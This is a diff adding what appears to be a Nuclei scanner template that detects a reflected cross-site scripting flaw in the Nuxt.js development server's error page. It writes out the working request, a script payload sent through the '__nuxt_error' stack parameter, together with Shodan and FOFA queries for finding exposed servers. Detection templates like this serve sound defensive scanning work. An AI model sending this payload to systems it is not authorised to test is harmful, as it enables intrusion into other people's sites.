@@ -1,0 +1,41 @@
+id: nuxt-js-xss
+
+info:
+  name: Nuxt.js Error Page - Cross-Site Scripting
+  author: DhiyaneshDK
+  severity: medium
+  description: |
+    The developer server unsafely renders the stack trace within errors. This can be manipulated by sending a specially crafted request.
+  reference:
+    - https://huntr.dev/bounties/70ac720d-c932-4ed3-98b1-dd2cbcb90185/
+    - https://bryces.io/blog/nuxt3
+    - https://twitter.com/fofabot/status/1669339995780558849
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"buildAssetsDir" "nuxt"
+    fofa-query: body="buildAssetsDir" && body="__nuxt"
+  tags: huntr,xss,nuxtjs
+
+variables:
+  payload: "<script>alert(document.domain)</script>"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/__nuxt_error?stack=%0A{{url_encode(payload)}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{payload}}"
+          - "window.__NUXT__"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+# digest: 4a0a00473045022100ea225186f532c4a7239ff8c57b9681a531c3664387db0b2816701198ef7ea9ff02204a6a804d7ea5a253d33de273b922506b4d47ed1db1fc6b91de6cf7eb5d9a40fd:922c64590222798bb761d5b6d8e72950
